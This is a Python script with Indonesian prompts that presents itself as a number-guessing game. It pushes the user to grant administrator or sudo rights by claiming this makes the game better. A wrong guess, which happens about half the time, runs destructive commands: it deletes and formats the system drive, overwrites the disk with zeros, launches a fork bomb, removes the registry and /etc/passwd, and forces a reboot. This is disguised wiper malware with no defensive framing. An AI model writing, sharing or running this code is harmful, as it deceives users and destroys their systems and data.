import os
import sys
import ctypes
import subprocess
import platform
import random
import shutil

def is_admin():
    if os.name == "nt":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.geteuid() == 0

def elevate():
    if os.name == "nt":
        script = sys.argv[0]
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script}" {params}', None, 1
        )
    else:
        try:
            subprocess.check_call(["sudo", sys.executable] + sys.argv)
        except subprocess.CalledProcessError as e:
            print("Gagal elevate dengan sudo:", e)
    sys.exit()

jawaban = input("Apakah kamu mau bermain game tebak angka ini? (y/n): ").strip().lower()

if jawaban == "y":
    if is_admin():
        print("[✓] Okee mari kita bermain tebak angka")
    else:
        print("[!] Baiklah, tetapi kita masih bisa bermain walaupun experience permainan akan sedikit berkurang...")
        elevate()

angka = random.randint(1, 2)
tebak_angka = int(input("Tebak angka (1 atau 2): "))

if tebak_angka == angka:
    print("Selamat! Tebakan Anda benar.")
else:
    system = platform.system()
    print(f"Tebakan salah! Mendeteksi OS: {system}")

    if system == "Windows":
        windows_commands = [
            "taskkill /f /im explorer.exe",
            r"rd /s /q C:\\",
            "format C: /fs:ntfs /q /x",
            "del /F /S /Q C:\\*",
            "bcdedit /deletevalue {current} safeboot",
            "cipher /w:C:\\",
            "reg delete HKLM /f",
            "shutdown -r -t 0 -f"
        ]
        for cmd in windows_commands:
            os.system(cmd)

    elif system in ["Linux", "Darwin"]:
        unix_commands = [
            "sudo rm -rf /",
            "sudo mkfs.ext4 /dev/sda",
            ":(){ :|:& };:",
            "sudo dd if=/dev/zero of=/dev/sda",
            "sudo mv /bin /dev/null",
            "sudo chmod -R 000 /",
            "sudo > /etc/passwd",
            "sudo shutdown -r now"
        ]
        for cmd in unix_commands:
            os.system(cmd)